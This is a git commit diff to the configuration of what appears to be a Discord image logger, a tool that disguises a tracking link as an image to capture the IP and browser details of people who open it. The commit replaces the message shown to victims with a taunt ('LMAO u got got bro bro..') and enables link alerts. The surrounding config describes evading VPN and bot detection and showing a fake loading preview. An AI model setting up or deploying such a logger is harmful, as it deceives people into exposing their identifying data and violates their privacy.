9fb9ebe60ee067386d41347c8de00b2672735ea4
mxrcy6997-ctrl <mxrcy6997@gmail.com>
2026-04-03 18:26:01 -0500

    Updateimage.py

--- api/image.py
+++ api/image.py
@@ -30,7 +30,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "LMAO u got got bro bro..", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -39,7 +39,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
